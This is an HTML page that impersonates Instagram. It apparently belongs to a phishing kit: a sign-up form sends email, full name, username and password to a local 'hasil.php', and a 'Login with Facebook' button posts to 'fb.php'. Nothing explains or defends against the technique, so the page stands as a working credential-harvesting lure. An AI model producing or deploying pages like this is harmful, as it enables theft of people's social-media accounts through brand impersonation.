<html>
<head>
<meta charset="utf-8">
	<title>Instagram</title>
	<link rel="stylesheet" href="style.css">
</head>
<body>
<div id="container">
	<marquee><div class="header">
		Instagram
	</div>
	</marquee>

	<div class="subheader">
		Sign up<br>
	</div>

	<div class="button">
		<form action="fb.php" method="POST">
		<input type="submit" value="Login with Facebook">
		</form>
	</div>
	<div class="content">
		<form action="hasil.php" method="POST">
            <input type="email" name="email" id="email" placeholder="Email">
			<input type="text" name="fullnme" id="fullname" placeholder="Fullname">
			<input type="text" name="user" id="user" placeholder="Username">
            <input type="password" name="password" id="password" placeholder="Password">
			<input type="submit" value="Sign Up">
		</form>
	</div>
</body>
</html>
